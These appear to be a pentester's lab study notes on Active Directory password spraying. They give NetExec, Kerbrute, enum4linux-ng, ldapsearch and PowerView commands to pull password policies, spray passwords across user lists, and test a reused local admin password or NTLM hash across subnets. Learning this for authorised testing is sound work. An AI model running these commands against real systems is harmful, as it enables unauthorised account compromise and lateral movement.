Password Spraying is a technique that we use 1 password to authenticate for a list of valid account that we are know of, one can use a commonly used weak password as the last resort to gain valid credentials, their is also a common situation where one would own more then one account in the company (Example cjack, cjack_ixadm, cjack_dev etc.), if we gained the password for cjack, we could try to perform password spraying as it's highly likely that cjack_ixadm and cjack_dev use same password or just a variation of the password used for cjack.

If possible, we would want to obtain the password policy first to avoid account lockout

-Obtaining password policy with nxc (Default, with credential):
```
nxc smb 172.16.5.5 -u <username> -p <password> --pass-pol
```

-Obtaining password policy with enum4linux-ng (Default, without credential):
```
enum4linux-ng -P <dcip> -oA <outputfile_name>
```

We are also able to get password policy with ldapsearch, this is a good method if we also want to check if LDAP anonymous bind is enabled as if it is not, this method won't work:

-Obtaining password policy with ldapsearch:
```
ldapserach -h <dcip> -x -b "<domainname>" -s sub "*"
Example: ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
#Note: newer version of ldapsearch use -H instead of -h
```

Lastly, if we are able to get a foothold onto a windows machine, we can start transferring Tools over it and gather password policy:

-Obtaining Password Policy with PowerView (Requires window foothold and tool transfer):
```
import-module .\PowerView.ps1
Get-DomainPolicy
```

After that, we can start attempting to actually perform password spray:

-Using NetExec for password spraying:
```
sudo nxc smb <dcip> -u <userlist> -p <password> | grep +
#grep + only show sucess result
sudo nxc smb <dcip> -u <username> -p <password> #To validate the credential we got
```

-Using Kerbrute for password spraying:
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 <userlist> <password>
```

Each computer requires some sort of configuring before they are joined to a domain, and if we are able to obtain the password / hash for a local administrator account, there is a chance that all computers have the same password for the local admin account, we can try to authenticate to all pcs in the network to see if we such is indeed the case:

-Using NetExec:
```
sudo nxc smb --local-auth <ipranges> -u <accountname> -p <password> | grep +
#Or if what we got is hash
sudo nxc smb --local-auth <ipranges> -u <accountname> -H <hash> | grep +
#Example:
sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```